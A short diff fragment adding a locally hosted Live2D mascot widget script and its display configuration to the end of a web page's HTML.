+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":true,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":false},"log":false});</script>
+</body>
+</html>
